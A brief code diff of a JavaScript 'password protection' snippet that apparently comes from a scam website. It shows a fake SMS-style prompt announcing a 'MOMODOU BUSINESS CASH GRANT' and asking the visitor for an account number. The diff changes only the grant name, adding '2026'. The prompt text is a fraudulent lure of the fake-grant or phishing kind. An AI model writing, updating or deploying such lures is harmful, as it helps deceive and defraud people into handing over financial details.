@@ -1,7 +1,7 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = 'WITHDRAW CASH'
 password = prompt(
-  'SMS: Congratulations! You are eligible to receive MOMODOU BUSINESS CASH GRANT. Please press OK to Enter your Account Number.',
+  'SMS: Congratulations! You are eligible to receive MOMODOU 2026 BUSINESS CASH GRANT. Please press OK to Enter your Account Number.',
   'WITHDRAW CASH'
 );
 if (password != 'WITHDRAW CASH') {
